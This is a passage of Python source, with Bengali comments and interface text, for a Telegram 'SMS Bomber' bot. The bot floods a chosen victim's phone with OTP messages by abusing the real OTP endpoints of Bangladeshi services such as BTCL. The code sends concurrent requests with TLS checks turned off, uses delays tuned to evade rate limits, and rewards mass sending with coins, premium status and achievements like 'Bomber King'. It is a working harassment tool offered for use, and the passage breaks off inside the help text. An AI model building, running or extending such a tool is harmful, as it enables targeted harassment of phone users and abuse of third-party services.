            {"name": "BTCL BDIA", "url": "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobileNo": "{phone}"}},
            {"name": "BTCL PhoneBill", "url": "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNbr": "{phone}"}},
        ]
    
    def get_all_apis(self):
        """সব API পান (বেস + কাস্টম)"""
        apis = self.base_apis.copy()
        
        # ডাটাবেস থেকে সক্রিয় কাস্টম API গুলো যোগ করুন
        self.db.cursor.execute("""
            SELECT name, url, method, headers, body 
            FROM custom_apis 
            WHERE is_active = 1
        """)
        custom_apis = self.db.cursor.fetchall()
        
        for custom_api in custom_apis:
            try:
                api = {
                    "name": custom_api['name'],
                    "url": custom_api['url'],
                    "method": custom_api['method'],
                    "headers": json.loads(custom_api['headers']) if custom_api['headers'] else {},
                    "body": json.loads(custom_api['body']) if custom_api['body'] else {}
                }
                apis.append(api)
            except:
                pass
        
        return apis
    
    def get_active_apis(self):
        """শুধু সক্রিয় API গুলো পান"""
        all_apis = self.get_all_apis()
        active_apis = []
        
        for api in all_apis:
            self.db.cursor.execute("SELECT is_active FROM api_stats WHERE api_name = ?", (api['name'],))
            result = self.db.cursor.fetchone()
            if not result or result['is_active'] == 1:
                active_apis.append(api)
        
        return active_apis
    
    def send_request(self, api, phone):
        """API রিকুয়েস্ট পাঠান"""
        try:
            url = api["url"].replace("{phone}", phone)
            headers = api.get("headers", {})
            
            if api["method"] == "GET":
                response = requests.get(url, headers=headers, timeout=5, verify=False)
            else:
                body = api.get("body", {})
                if body:
                    for key in body:
                        if isinstance(body[key], str):
                            body[key] = body[key].replace("{phone}", phone)
                
                if "application/json" in str(headers.get("Content-Type", "")):
                    response = requests.post(url, headers=headers, json=body, timeout=5, verify=False)
                else:
                    response = requests.post(url, headers=headers, data=body, timeout=5, verify=False)
            
            return response.status_code in [200, 201, 202, 204]
        except Exception as e:
            logger.debug(f"API error: {api['name']} - {str(e)}")
            return False
    
    def test_api(self, api, phone="01700000000"):
        """API টেস্ট করুন"""
        return self.send_request(api, phone)

# ====================== টেলিগ্রাম বট ======================

class SMSBomberBot:
    def __init__(self, token):
        self.token = token
        self.db = Database()
        self.api_manager = ApiManager(self.db)
        self.app = None
        
        # কনফিগারেশন
        self.COINS_PER_SMS = 1
        self.DAILY_BONUS = 5
        self.REFERRAL_BONUS = 10
        self.PREMIUM_PRICE = 50
        self.CHANNEL_USERNAME = "BlackoutZoneRBX404"
        self.MESSAGE_COUNTS = [10, 20, 30, 50, 75, 100]
        self.ADMIN_IDS = [7294948308]
        self.WELCOME_IMAGE = "welcome.jpg"
        
        # কনভার্সেশন স্টেট
        self.SELECTING_ACTION = 1
        self.ENTERING_PHONE = 2
        self.ENTERING_CUSTOM_COUNT = 3
        self.ENTERING_CUSTOM_API = 4
        self.BROADCAST_MESSAGE = 5
        self.BROADCAST_CONFIRM = 6
        self.SEARCH_USER = 7
        self.ADD_CHANNEL = 8
    
    def get_main_keyboard(self):
        """মেইন মেনু কিবোর্ড"""
        keyboard = [
            [InlineKeyboardButton("📱 SMS বোমা", callback_data="send_bomb")],
            [
                InlineKeyboardButton("👤 প্রোফাইল", callback_data="profile"),
                InlineKeyboardButton("🪙 কয়েন", callback_data="coins")
            ],
            [
                InlineKeyboardButton("⭐ প্রিমিয়াম", callback_data="premium"),
                InlineKeyboardButton("🎁 ফ্রি ট্রায়াল", callback_data="free_trial")
            ],
            [
                InlineKeyboardButton("📊 স্ট্যাটাস", callback_data="stats"),
                InlineKeyboardButton("🏆 লিডারবোর্ড", callback_data="leaderboard")
            ],
            [
                InlineKeyboardButton("👥 রেফার", callback_data="refer"),
                InlineKeyboardButton("🔧 কাস্টম API", callback_data="custom_api")
            ],
            [
                InlineKeyboardButton("⚙️ সেটিংস", callback_data="settings"),
                InlineKeyboardButton("📖 সাহায্য", callback_data="help")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_count_keyboard(self):
        """SMS কাউন্ট কিবোর্ড"""
        keyboard = []
        row = []
        for count in self.MESSAGE_COUNTS:
            row.append(InlineKeyboardButton(f"{count}টি", callback_data=f"count_{count}"))
            if len(row) == 3:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        
        keyboard.append([InlineKeyboardButton("✏️ কাস্টম সংখ্যা", callback_data="custom_count")])
        keyboard.append([InlineKeyboardButton("🔙 মেইন মেনু", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_settings_keyboard(self):
        """সেটিংস কিবোর্ড"""
        keyboard = [
            [InlineKeyboardButton("🌐 ভাষা পরিবর্তন", callback_data="language")],
            [InlineKeyboardButton("🔔 নোটিফিকেশন", callback_data="notification_settings")],
            [InlineKeyboardButton("🔙 মেইন মেনু", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_notification_keyboard(self, current_status):
        """নোটিফিকেশন সেটিংস কিবোর্ড"""
        status_text = "✅ চালু" if current_status else "❌ বন্ধ"
        toggle_text = "🔕 নোটিফিকেশন বন্ধ করুন" if current_status else "🔔 নোটিফিকেশন চালু করুন"
        
        keyboard = [
            [InlineKeyboardButton(f"বর্তমান: {status_text}", callback_data="noop")],
            [InlineKeyboardButton(toggle_text, callback_data="toggle_notifications")],
            [InlineKeyboardButton("🔙 সেটিংস", callback_data="settings")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_language_keyboard(self):
        """ভাষা কিবোর্ড"""
        keyboard = [
            [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")],
            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
            [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_join_keyboard(self, channels):
        """ফোর্স জয়েন কিবোর্ড"""
        keyboard = []
        for channel in channels:
            keyboard.append([
                InlineKeyboardButton(f"📢 {channel['channel_name']}", url=f"https://t.me/{channel['channel_username']}")
            ])
        keyboard.append([InlineKeyboardButton("🔄 আবার চেক করুন", callback_data="check_join")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_admin_keyboard(self):
        """অ্যাডমিন প্যানেল কিবোর্ড"""
        keyboard = [
            [InlineKeyboardButton("📊 ড্যাশবোর্ড", callback_data="admin_dashboard")],
            [
                InlineKeyboardButton("👥 ইউজার ম্যানেজমেন্ট", callback_data="admin_users"),
                InlineKeyboardButton("📢 ব্রডকাস্ট", callback_data="admin_broadcast")
            ],
            [
                InlineKeyboardButton("🛡️ ফোর্স জয়েন", callback_data="admin_force_join"),
                InlineKeyboardButton("📈 অ্যানালিটিক্স", callback_data="admin_analytics")
            ],
            [
                InlineKeyboardButton("⚙️ বট সেটিংস", callback_data="admin_settings"),
                InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_user_management_keyboard(self):
        """ইউজার ম্যানেজমেন্ট কিবোর্ড"""
        keyboard = [
            [InlineKeyboardButton("🔍 ইউজার খুঁজুন", callback_data="admin_search_user")],
            [InlineKeyboardButton("📋 ইউজার তালিকা", callback_data="admin_user_list")],
            [InlineKeyboardButton("🔙 অ্যাডমিন প্যানেল", callback_data="admin_panel")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_force_join_admin_keyboard(self):
        """ফোর্স জয়েন অ্যাডমিন কিবোর্ড"""
        keyboard = [
            [InlineKeyboardButton("➕ চ্যানেল যোগ করুন", callback_data="admin_add_channel")],
            [InlineKeyboardButton("🗑️ চ্যানেল রিমুভ করুন", callback_data="admin_remove_channel")],
            [InlineKeyboardButton("📋 চ্যানেল তালিকা", callback_data="admin_channel_list")],
            [
                InlineKeyboardButton("✅ ফোর্স জয়েন চালু", callback_data="admin_fj_enable"),
                InlineKeyboardButton("❌ ফোর্স জয়েন বন্ধ", callback_data="admin_fj_disable")
            ],
            [InlineKeyboardButton("🔙 অ্যাডমিন প্যানেল", callback_data="admin_panel")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def format_profile_card(self, user_data):
        """প্রোফাইল কার্ড ফরম্যাট করুন"""
        user_id = user_data['user_id']
        username = f"@{user_data['username']}" if user_data['username'] else "N/A"
        first_name = user_data['first_name'] or "Unknown"
        last_name = user_data['last_name'] or ""
        full_name = f"{first_name} {last_name}".strip()
        join_date = user_data['join_date'][:10] if user_data['join_date'] else "N/A"
        last_active = user_data['last_active'][:16] if user_data['last_active'] else "N/A"
        coins = self.db.get_coins(user_id)
        total_sent = user_data['total_sent'] or 0
        
        # স্ট্যাটাস নির্ধারণ
        if user_data['is_banned']:
            status = "🚫 ব্যান"
        elif user_data['is_premium']:
            status = "⭐ প্রিমিয়াম"
        elif user_data['is_free_trial']:
            status = "🎁 ফ্রি ট্রায়াল"
        else:
            status = "✅ সক্রিয়"
        
        # অ্যাচিভমেন্ট
        achievements = self.db.get_user_achievements(user_id)
        achievement_count = len(achievements)
        
        profile_text = f"""
╔══════════════════════════╗
        👤 **প্রোফাইল কার্ড**
╚══════════════════════════╝

📛 **নাম:** {full_name}
👤 **ইউজারনেম:** {username}
🆔 **ইউজার আইডি:** `{user_id}`
📅 **জয়েন তারিখ:** {join_date}
🕐 **শেষ সক্রিয়:** {last_active}
📊 **স্ট্যাটাস:** {status}

━━━━━━━━━━━━━━━━━━━━━━━━━━

🪙 **কয়েন:** {coins}
📨 **মোট SMS:** {total_sent}
🏅 **অ্যাচিভমেন্ট:** {achievement_count}টি

━━━━━━━━━━━━━━━━━━━━━━━━━━

📢 **চ্যানেল:** @{self.CHANNEL_USERNAME}
"""
        return profile_text
    
    def format_result_message(self, phone, count, success_count, fail_count, results):
        """রেজাল্ট মেসেজ ফরম্যাট করুন"""
        success_rate = (success_count / count * 100) if count > 0 else 0
        emoji = "✅" if success_rate > 60 else "⚠️" if success_rate > 30 else "❌"
        
        # প্রোগ্রেস বার
        progress = int(success_rate / 2)
        bar = "▓" * progress + "░" * (50 - progress)
        
        text = f"""
╔══════════════════════════╗
      {emoji} **SMS বোমা রিপোর্ট**
╚══════════════════════════╝

📱 **টার্গেট:** `{phone}`
📨 **মোট চেষ্টা:** {count}টি
✅ **সফল:** {success_count}টি
❌ **ব্যর্থ:** {fail_count}টি
📊 **সাফল্যের হার:** {success_rate:.1f}%

━━━━━━━━━━━━━━━━━━━━━━━━━━

📈 **প্রোগ্রেস:**
`{bar}` {success_rate:.0f}%

━━━━━━━━━━━━━━━━━━━━━━━━━━

🔍 **বিস্তারিত ফলাফল:**
{chr(10).join(results[:10])}
{f'...এবং বাকি {len(results)-10}টি' if len(results) > 10 else ''}

━━━━━━━━━━━━━━━━━━━━━━━━━━

📢 **চ্যানেল:** @{self.CHANNEL_USERNAME}
"""
        return text
    
    def smart_delay(self, api_name, attempt=1):
        """স্মার্ট ডিলে"""
        delays = {
            "RedX": 0.8,
            "Robi": 1.0,
            "GP": 0.6,
            "Bikroy": 0.9,
            "default": 0.4
        }
        base_delay = delays.get(api_name.split()[0] if api_name else "default", delays["default"])
        if attempt > 1:
            base_delay *= (attempt * 0.5)
        return min(base_delay, 3.0)
    
    def check_achievements(self, user_id, total_sent):
        """অ্যাচিভমেন্ট চেক করুন"""
        achievements = {
            "first_bomb": {"name": "🎯 প্রথম বোমা", "condition": total_sent >= 1},
            "bomber_50": {"name": "💣 ৫০ SMS", "condition": total_sent >= 50},
            "bomber_100": {"name": "💣 সেঞ্চুরিয়ান", "condition": total_sent >= 100},
            "bomber_500": {"name": "🔥 ৫০০ SMS", "condition": total_sent >= 500},
            "bomber_1000": {"name": "👑 বোম্বার কিং", "condition": total_sent >= 1000},
            "bomber_5000": {"name": "🤴 লেজেন্ড", "condition": total_sent >= 5000},
            "bomber_10000": {"name": "🌟 গড অফ বোম্বার", "condition": total_sent >= 10000},
        }
        
        new_achievements = []
        for key, ach in achievements.items():
            if ach["condition"]:
                self.db.cursor.execute(
                    "SELECT 1 FROM achievements WHERE user_id = ? AND achievement_key = ?",
                    (user_id, key)
                )
                if not self.db.cursor.fetchone():
                    self.db.cursor.execute(
                        "INSERT INTO achievements (user_id, achievement_key, achievement_name, earned_date) VALUES (?, ?, ?, ?)",
                        (user_id, key, ach["name"], datetime.now().isoformat())
                    )
                    self.db.conn.commit()
                    new_achievements.append(ach["name"])
        
        if new_achievements:
            self.db.cursor.execute("UPDATE users SET total_achievements = total_achievements + ? WHERE user_id = ?", 
                                   (len(new_achievements), user_id))
            self.db.conn.commit()
        
        return new_achievements
    
    async def check_channel_membership(self, user_id):
        """চ্যানেল মেম্বারশিপ চেক করুন"""
        channels = self.db.get_force_join_channels()
        if not channels or not self.db.is_force_join_enabled():
            return True, []
        
        not_joined = []
        for channel in channels:
            try:
                if self.app and self.app.bot:
                    chat_member = await self.app.bot.get_chat_member(channel['channel_id'], user_id)
                    if chat_member.status not in ["member", "administrator", "creator"]:
                        not_joined.append(channel)
            except:
                # চ্যানেল চেক করা সম্ভব না হলে স্কিপ করুন
                pass
        
        return len(not_joined) == 0, not_joined
    
    async def send_bomb_smart(self, update, context, phone, count):
        """স্মার্ট SMS বোমা পাঠান"""
        message = await update.message.reply_text("⏳ প্রস্তুতি চলছে...")
        
        # সব API সংগ্রহ করুন
        all_apis = self.api_manager.get_active_apis()
        
        # নিশ্চিত করুন যে count এর বেশি API আছে
        if count > len(all_apis):
            # সব API ব্যবহার করুন এবং কিছু API একাধিকবার ব্যবহার করুন
            multiplier = (count // len(all_apis)) + 1
            extended_apis = all_apis * multiplier
            selected_apis = extended_apis[:count]
        else:
            selected_apis = random.sample(all_apis, count)
        
        success_count = 0
        fail_count = 0
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for i, api in enumerate(selected_apis):
                api_copy = api.copy()
                if "body" in api_copy:
                    body = api_copy["body"]
                    for key in body:
                        if isinstance(body[key], str):
                            body[key] = body[key].replace("{phone}", phone)
                
                # ছোট ডিলে যোগ করুন
                delay = self.smart_delay(api['name'])
                future = executor.submit(self._delayed_request, api_copy, phone, delay)
                futures.append((api, future))
            
            completed = 0
            total = len(futures)
            
            for api, future in futures:
                try:
                    success = future.result(timeout=15)
                    completed += 1
                    
                    if success:
                        success_count += 1
                        results.append(f"✅ {api['name']}")
                        self.db.update_api_stats(api['name'], True)
                    else:
                        fail_count += 1
                        results.append(f"❌ {api['name']}")
                        self.db.update_api_stats(api['name'], False)
                    
                    # প্রতি ৫টি API পর প্রোগ্রেস আপডেট করুন
                    if completed % 5 == 0 or completed == total:
                        progress = int(completed / total * 100)
                        bar = "▓" * (progress // 2) + "░" * (50 - progress // 2)
                        
                        await message.edit_text(
                            f"📨 **SMS পাঠানো হচ্ছে...**\n\n"
                            f"`{bar}` {progress}%\n"
                            f"📊 {completed}/{total}\n"
                            f"✅ সফল: {success_count} | ❌ ব্যর্থ: {fail_count}"
                        )
                    
                except Exception as e:
                    fail_count += 1
                    results.append(f"❌ {api['name']} (Timeout)")
                    logger.error(f"API error: {api['name']} - {str(e)}")
        
        # ডেড API গুলো পরিষ্কার করুন
        removed_apis = self.db.check_and_remove_dead_apis()
        if removed_apis:
            logger.info(f"Removed dead APIs: {removed_apis}")
        
        await message.delete()
        return success_count, fail_count, results
    
    def _delayed_request(self, api, phone, delay):
        """ডিলে সহ রিকুয়েস্ট পাঠান"""
        time.sleep(delay)
        return self.api_manager.send_request(api, phone)
    
    # ====================== হ্যান্ডলার ফাংশন ======================
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """স্টার্ট কমান্ড হ্যান্ডলার"""
        user = update.effective_user
        user_id = user.id
        
        # ইউজার যোগ করুন
        self.db.add_user(user_id, user.username, user.first_name, user.last_name)
        self.db.update_last_active(user_id)
        
        # ব্যান চেক
        if self.db.is_banned(user_id):
            await update.message.reply_text(
                "⛔ **অ্যাক্সেস অস্বীকার**\n\n"
                "আপনি এই বট ব্যবহার থেকে ব্যান হয়েছেন।\n"
                "আপিল করতে অ্যাডমিনের সাথে যোগাযোগ করুন।"
            )
            return
        
        # ওয়েলকাম মেসেজ
        welcome_msg = f"""
╔══════════════════════════╗
    🔥 **SMS BOMBER BOT**
╚══════════════════════════╝

👋 **স্বাগতম, {user.first_name}!**

📱 এই বট দিয়ে আপনি ৭৫+ API থেকে OTP/SMS পাঠাতে পারবেন।

━━━━━━━━━━━━━━━━━━━━━━━━━━

🪙 **কয়েন সিস্টেম:**
• ১টি SMS = ১ কয়েন
• ডেইলি বোনাস: {self.DAILY_BONUS} কয়েন
• রেফারেল: {self.REFERRAL_BONUS} কয়েন

🎁 **ফ্রি ট্রায়াল:**
• ১টি কাস্টম API = ১ দিন ফ্রি

━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **দ্রুত শুরু করতে নিচের মেনু ব্যবহার করুন!**
"""
        await update.message.reply_text(welcome_msg, reply_markup=self.get_main_keyboard())
    
    async def check_join_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """চ্যানেল জয়েন চেক ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        joined, not_joined = await self.check_channel_membership(user_id)
        
        if joined:
            await query.edit_message_text(
                "✅ **চ্যানেল জয়েন সফল!**\n\n"
                "এখন আপনি বট ব্যবহার করতে পারবেন।",
                reply_markup=self.get_main_keyboard()
            )
        else:
            await query.edit_message_text(
                "🔒 **অ্যাক্সেস প্রয়োজন**\n\n"
                "নিচের চ্যানেলগুলোতে যোগদান করুন:\n\n"
				 f"{chr(10).join([f"📢 {ch['channel_name']}" for ch in not_joined])}\n\n"
                "যোগদানের পর '🔄 আবার চেক করুন' বাটনে ক্লিক করুন।",
                reply_markup=self.get_join_keyboard(not_joined)
            )
    
    async def profile_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """প্রোফাইল ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        user_data = self.db.get_user(user_id)
        if not user_data:
            await query.edit_message_text("❌ ইউজার পাওয়া যায়নি!")
            return
        
        profile_text = self.format_profile_card(user_data)
        
        keyboard = [
            [InlineKeyboardButton("📊 বিস্তারিত স্ট্যাটস", callback_data="stats")],
            [InlineKeyboardButton("🔙 মেইন মেনু", callback_data="back_main")]
        ]
        
        await query.edit_message_text(profile_text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    async def coins_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """কয়েন ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        coins = self.db.get_coins(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🔄 ডেইলি বোনাস নিন", callback_data="daily_bonus")],
            [InlineKeyboardButton("🔙 মেইন মেনু", callback_data="back_main")]
        ]
        
        text = f"""
╔══════════════════════════╗
        🪙 **কয়েন সেন্টার**
╚══════════════════════════╝

💰 **বর্তমান ব্যালেন্স:** {coins} কয়েন

━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 **কয়েন পাওয়ার উপায়:**

📨 SMS পাঠান → +{self.COINS_PER_SMS} কয়েন/SMS
🎁 ডেইলি বোনাস → +{self.DAILY_BONUS} কয়েন
👥 রেফারেল → +{self.REFERRAL_BONUS} কয়েন

━━━━━━━━━━━━━━━━━━━━━━━━━━

⭐ **প্রিমিয়াম:** {self.PREMIUM_PRICE} কয়েন
"""
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    async def daily_bonus_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ডেইলি বোনাস ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        last_bonus = context.user_data.get("last_bonus")
        now = datetime.now()
        
        can_claim = False
        if not last_bonus:
            can_claim = True
        elif (now - last_bonus).days >= 1:
            can_claim = True
        
        if can_claim:
            self.db.update_coins(user_id, self.DAILY_BONUS)
            context.user_data["last_bonus"] = now
            
            await query.edit_message_text(
                f"✅ **ডেইলি বোনাস সফল!**\n\n"
                f"🎁 +{self.DAILY_BONUS} কয়েন পেয়েছেন!\n"
                f"💰 মোট ব্যালেন্স: {self.db.get_coins(user_id)} কয়েন",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 কয়েন সেন্টার", callback_data="coins")]])
            )
        else:
            remaining = timedelta(days=1) - (now - last_bonus)
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            
            await query.edit_message_text(
                f"⏳ **আপনি ইতিমধ্যে বোনাস নিয়েছেন!**\n\n"
                f"পরবর্তী বোনাস: {hours} ঘন্টা {minutes} মিনিট পর",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 কয়েন সেন্টার", callback_data="coins")]])
            )
    
    async def send_bomb_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """SMS বোমা ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        # ব্যান চেক
        if self.db.is_banned(user_id):
            await query.edit_message_text("⛔ আপনি ব্যান হয়েছেন!")
            return
        
        # চ্যানেল জয়েন চেক
        joined, not_joined = await self.check_channel_membership(user_id)
        if not joined:
            await query.edit_message_text(
                "🔒 **অ্যাক্সেস প্রয়োজন**\n\n"
                "বট ব্যবহার করতে নিচের চ্যানেলগুলোতে জয়েন করুন:",
                reply_markup=self.get_join_keyboard(not_joined)
            )
            return
        
        coins = self.db.get_coins(user_id)
        user_data = self.db.get_user(user_id)
        is_premium = user_data['is_premium'] == 1 if user_data else False
        is_free_trial = self.db.check_free_trial(user_id)
        
        if coins < 5 and not is_premium and not is_free_trial:
            await query.edit_message_text(
                f"❌ **পর্যাপ্ত কয়েন নেই!**\n\n"
                f"💰 আপনার কয়েন: {coins}\n"
                f"⚡ নূন্যতম প্রয়োজন: ৫ কয়েন\n\n"
                f"কয়েন বাড়াতে ডেইলি বোনাস নিন বা রেফারেল করুন!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 ডেইলি বোনাস", callback_data="daily_bonus")],
                    [InlineKeyboardButton("🔙 মেইন মেনু", callback_data="back_main")]
                ])
            )
            return
        
        text = f"""
╔══════════════════════════╗
      📱 **SMS বোমা**
╚══════════════════════════╝

📊 **কতটি SMS পাঠাবেন?**

━━━━━━━━━━━━━━━━━━━━━━━━━━

💳 **প্রয়োজনীয় কয়েন:** {self.COINS_PER_SMS} কয়েন/SMS
💰 **আপনার কয়েন:** {coins}
⭐ **প্রিমিয়াম:** {'✅ হ্যাঁ' if is_premium else '❌ না'}
🎁 **ফ্রি ট্রায়াল:** {'✅ সক্রিয়' if is_free_trial else '❌ নেই'}
"""
        await query.edit_message_text(text, reply_markup=self.get_count_keyboard())
    
    async def count_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """কাউন্ট সিলেক্ট ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        count = int(query.data.split("_")[1])
        
        context.user_data["target_count"] = count
        context.user_data["waiting_phone"] = True
        
        coins = self.db.get_coins(user_id)
        coins_needed = count * self.COINS_PER_SMS
        
        await query.edit_message_text(
            f"📱 **{count}টি SMS পাঠানো হবে**\n\n"
            f"📞 **টার্গেট ফোন নম্বর দিন:**\n"
            f"(উদাহরণ: 017xxxxxxxx)\n\n"
            f"💳 প্রয়োজনীয় কয়েন: {coins_needed}\n"
            f"💰 আপনার কয়েন: {coins}\n\n"
            f"❌ বাতিল করতে /cancel লিখুন",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 বাতিল", callback_data="back_main")]])
        )
    
    async def custom_count_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """কাস্টম কাউন্ট ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "✏️ **কাস্টম সংখ্যা**\n\n"
            "কতটি SMS পাঠাতে চান?\n"
            "(১-৭৫ এর মধ্যে লিখুন)\n\n"
            "উদাহরণ: `50`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="send_bomb")]])
        )
        context.user_data["waiting_custom_count"] = True
    
    async def handle_phone_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ফোন নম্বর ইনপুট হ্যান্ডলার"""
        if not context.user_data.get("waiting_phone"):
            return
        
        user_id = update.effective_user.id
        phone = update.message.text.strip()
        
        # ফোন নম্বর ভ্যালিডেশন
        if not phone.isdigit() or len(phone) < 10 or len(phone) > 15:
            await update.message.reply_text(
                "❌ **ভুল নম্বর!**\n\n"
                "সঠিক ফরম্যাটে নম্বর দিন:\n"
                "উদাহরণ: `017xxxxxxxx`\n\n"
                "আবার চেষ্টা করুন অথবা /cancel লিখুন।"
            )
            return
        
        count = context.user_data.get("target_count", 10)
        user_data = self.db.get_user(user_id)
        is_premium = user_data['is_premium'] == 1 if user_data else False
        is_free_trial = self.db.check_free_trial(user_id)
        coins_needed = count * self.COINS_PER_SMS
        
        coins = self.db.get_coins(user_id)
        if not is_premium and not is_free_trial and coins < coins_needed:
            await update.message.reply_text(
                f"❌ **পর্যাপ্ত কয়েন নেই!**\n\n"
                f"প্রয়োজন: {coins_needed} কয়েন\n"
                f"আপনার: {coins} কয়েন\n\n"
                f"{coins_needed - coins} কয়েন কম আছে।",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🎁 ফ্রি ট্রায়াল", callback_data="free_trial")],
                    [InlineKeyboardButton("🔙 SMS বোমা", callback_data="send_bomb")]
                ])
            )
            return
        
        await update.message.reply_text(f"⏳ **{count}টি SMS পাঠানো হচ্ছে...**")
        
        success_count, fail_count, results = await self.send_bomb_smart(update, context, phone, count)
        
        # কয়েন আপডেট (ফ্রি ট্রায়াল বা প্রিমিয়াম হলে কয়েন কাটবে না)
        if not is_premium and not is_free_trial:
            self.db.update_coins(user_id, count)
        
        self.db.add_log(user_id, phone, count, success_count)
        
        # টোটাল সেন্ট আপডেট
        self.db.cursor.execute("UPDATE users SET total_sent = total_sent + ? WHERE user_id = ?", (count, user_id))
        self.db.conn.commit()
        
        # অ্যাচিভমেন্ট চেক
        user_data = self.db.get_user(user_id)
        total_sent = user_data['total_sent'] if user_data else 0
        new_achievements = self.check_achievements(user_id, total_sent)
        
        result_text = self.format_result_message(phone, count, success_count, fail_count, results)
        
        if new_achievements:
            result_text += f"\n\n🏅 **নতুন অ্যাচিভমেন্ট:**\n{chr(10).join(new_achievements)}"
        
        await update.message.reply_text(result_text, reply_markup=self.get_main_keyboard())
        
        context.user_data["waiting_phone"] = False
        context.user_data["target_count"] = 0
    
    async def handle_custom_count_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """কাস্টম কাউন্ট ইনপুট হ্যান্ডলার"""
        if not context.user_data.get("waiting_custom_count"):
            return
        
        try:
            count = int(update.message.text.strip())
            if 1 <= count <= 75:
                context.user_data["target_count"] = count
                context.user_data["waiting_phone"] = True
                context.user_data["waiting_custom_count"] = False
                
                user_id = update.effective_user.id
                coins = self.db.get_coins(user_id)
                coins_needed = count * self.COINS_PER_SMS
                
                await update.message.reply_text(
                    f"📱 **{count}টি SMS পাঠানো হবে**\n\n"
                    f"📞 **টার্গেট ফোন নম্বর দিন:**\n"
                    f"(উদাহরণ: 017xxxxxxxx)\n\n"
                    f"💳 প্রয়োজনীয় কয়েন: {coins_needed}\n"
                    f"💰 আপনার কয়েন: {coins}\n\n"
                    f"❌ বাতিল করতে /cancel লিখুন"
                )
            else:
                await update.message.reply_text("❌ **১-৭৫ এর মধ্যে সংখ্যা দিন!**")
        except:
            await update.message.reply_text("❌ **সঠিক সংখ্যা লিখুন!**")
    
    async def settings_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """সেটিংস ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "⚙️ **সেটিংস**\n\n"
            "আপনার পছন্দ অনুযায়ী বট কনফিগার করুন:",
            reply_markup=self.get_settings_keyboard()
        )
    
    async def notification_settings_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """নোটিফিকেশন সেটিংস ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        pref = self.db.get_notification_preference(user_id)
        current_status = pref['notifications'] == 1 if pref else True
        
        await query.edit_message_text(
            "🔔 **নোটিফিকেশন সেটিংস**\n\n"
            "বট থেকে নোটিফিকেশন পেতে চান কিনা সেট করুন:",
            reply_markup=self.get_notification_keyboard(current_status)
        )
    
    async def toggle_notifications_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """নোটিফিকেশন টগল ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        pref = self.db.get_notification_preference(user_id)
        current_status = pref['notifications'] == 1 if pref else True
        
        # টগল করুন
        self.db.update_notification_preference(user_id, not current_status)
        new_status = not current_status
        
        await query.edit_message_text(
            f"✅ **নোটিফিকেশন {'চালু' if new_status else 'বন্ধ'} করা হয়েছে!**",
            reply_markup=self.get_notification_keyboard(new_status)
        )
    
    async def help_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """সাহায্য ক্যালব্যাক"""
        query = update.callback_query
        await query.answer()
        
        help_text = """
╔══════════════════════════╗
        📖 **সাহায্য কেন্দ্র**
╚══════════════════════════╝

🔰 **কিভাবে ব্যবহার করবেন:**

1️⃣ **SMS বোমা** বাটনে ক্লিক করুন
2️⃣ কতটি SMS পাঠাবেন সিলেক্ট করুন
